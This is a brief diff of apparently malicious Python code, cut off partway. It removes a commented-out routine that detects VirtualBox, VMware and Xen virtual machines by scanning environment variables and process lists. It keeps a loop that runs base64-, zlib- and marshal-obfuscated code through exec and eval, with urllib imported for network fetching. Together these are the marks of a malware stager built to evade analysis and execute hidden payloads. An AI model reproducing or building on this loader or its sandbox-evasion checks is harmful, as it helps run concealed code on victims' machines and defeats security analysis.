@@ -4,12 +4,6 @@ from ctypes import*
 if sys.version_info[0]>2:
     from urllib import request
 urlopen=urllib.request.urlopen if sys.version_info[0]>2 else urllib.urlopen
-"""
-def environment():
-    environment = [key for key in os.environ if 'VBOX' in key]
-    processes = [line.split()[0 if os.name == 'nt' else -1] for line in os.popen('tasklist' if os.name == 'nt' else 'ps').read().splitlines()[3:] if line.split()[0 if os.name == 'nt' else -1].lower().split('.')[0] in ['xenservice', 'vboxservice', 'vboxtray', 'vmusrvc', 'vmsrvc', 'vmwareuser','vmwaretray', 'vmtoolsd', 'vmcompute', 'vmmem']]
-    return bool(environment + processes)
-"""
 while True:
     try:
         exec(eval(marshal.loads(zlib.decompress(base64.b64decode(
